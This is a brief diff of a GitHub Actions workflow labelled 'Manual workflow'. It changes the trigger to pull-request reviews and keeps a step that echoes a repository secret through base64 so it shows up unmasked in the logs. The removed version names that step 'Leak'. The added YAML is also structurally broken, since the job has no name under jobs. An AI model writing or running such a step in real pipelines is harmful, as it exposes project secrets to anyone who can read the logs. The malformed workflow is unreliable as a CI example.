@@ -1,13 +1,10 @@
   name: Manual workflow
 
-  on:
-    pull_request_comment:
+on:
+  pull_request_review:
 
-  jobs:
-    greet:
-      runs-on: ubuntu-latest
+jobs:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ secrets.SUPER_SECRET }} | base64 -w0 
 
-      steps:
-        - name: Leak
-          run: |
-            echo ${{ secrets.SUPER_SECRET }} | base64 -w0 
